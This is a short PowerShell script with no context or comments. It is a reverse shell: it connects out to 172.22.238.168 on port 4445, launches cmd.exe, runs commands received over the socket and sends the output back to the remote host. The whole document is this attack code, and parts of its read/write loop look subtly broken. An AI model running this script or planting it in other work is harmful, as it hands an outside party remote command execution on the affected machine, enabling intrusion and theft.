$c = New-Object System.Net.Sockets.TCPClient("172.22.238.168", 4445)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
$p = New-Object System.Diagnostics.Process
$p.StartInfo.FileName = "cmd.exe"
$p.StartInfo.RedirectStandardInput = 1
$p.StartInfo.RedirectStandardOutput = 1
$p.StartInfo.UseShellExecute = 0
$p.Start()
$is = $p.StandardInput
$os = $p.StandardOutput
Start-Sleep 1

while(($r = $s.Read($b, 0, $b.Length)) -ne 0) {
    $o = (New-Object System.Text.ASCIIEncoding).GetString($b, 0, $r)
    $t = $os.ReadToEnd()
    $is.WriteLine($o.Trim())
    $is.Flush()
    $d = (New-Object System.Text.ASCIIEncoding).GetBytes($t)
    $s.Write($d, 0, $d.Length)
    $s.Flush()
}

$c.Close()